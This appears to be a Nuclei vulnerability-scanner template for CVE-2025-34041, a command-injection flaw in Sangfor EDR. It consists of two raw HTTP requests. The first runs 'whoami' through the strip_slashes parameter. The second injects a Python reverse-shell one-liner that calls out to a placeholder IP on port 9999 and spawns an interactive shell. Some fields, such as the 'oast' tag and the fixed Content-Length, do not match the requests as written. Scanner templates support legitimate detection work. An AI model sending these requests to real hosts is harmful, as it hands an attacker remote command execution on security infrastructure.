id: CVE-2025-34041

info:
  name: Sangfor EDR Remote Code Execution
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    Sangfor EDR contains a remote code execution vulnerability in the /tool/log/c.php endpoint
    via the strip_slashes parameter that allows unauthenticated attackers to execute arbitrary system commands.
  reference:
    - https://www.sangfor.com.cn/security-advisory
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-34041
    - https://cwe.mitre.org/data/definitions/78.html
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-78
  metadata:
    verified: true
    max-request: 2
    vendor: sangfor
    product: edr
    fofa-query: app="sangfor-EDR"
  tags: cve,cve2025,sangfor,edr,rce,oast,blind

http:
  - raw:
      - |
        GET /tool/log/c.php?strip_slashes=system&limit=whoami HTTP/1.1
        Host: {{Hostname}}

      - |
        POST /tool/log/c.php HTTP/1.1
        Host: {{Hostname}}
        Upgrade-Insecure-Requests: 1
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
        Content-Type: application/x-www-form-urlencoded;charset=utf-8
        Accept-Language: zh-CN,zh;q=0.9
        Content-Length: 256

        strip_slashes=system&host=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("xxx.xxx.xxx.xxx",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "uid="
          - "gid="
        part: body
      - type: status
        status:
          - 200
